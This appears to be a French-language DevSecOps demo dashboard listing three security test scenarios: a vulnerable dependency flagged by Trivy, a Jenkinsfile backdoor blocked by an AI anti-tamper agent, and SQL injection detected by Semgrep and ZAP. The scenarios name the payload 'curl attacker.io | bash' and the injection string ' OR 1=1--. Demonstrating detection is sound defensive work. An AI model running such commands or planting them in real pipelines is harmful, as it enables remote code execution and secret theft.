SCA · Trivy
En attente
Injection CVE Critique
Injection d'une dépendance vulnérable dans requirements.txt. Trivy détecte le CVE et l'agent IA génère automatiquement le patch.
Ajout py==1.11.0 → Trivy scan → CVE-2022-42969 → IA patch auto

Fix IApy → 1.11.0.post0

Pipeline · Anti-Tamper
En attente
Backdoor dans le Jenkinsfile
Injection d'une étape malveillante dans le Jenkinsfile : exfiltration de secrets via curl. L'agent Anti-Tamper détecte et bloque le déploiement.
Ajout curl | bash → Anti-Tamper → ALERTE → Pipeline bloqué
Payloadcurl attacker.io | bash
DétectionClaude Anti-Tamper

SAST + DAST
En attente
Injection SQL — Détection Live
Semgrep détecte l'injection SQL dans le code source. OWASP ZAP confirme la vulnérabilité en runtime avec des payloads réels ' OR 1=1--.
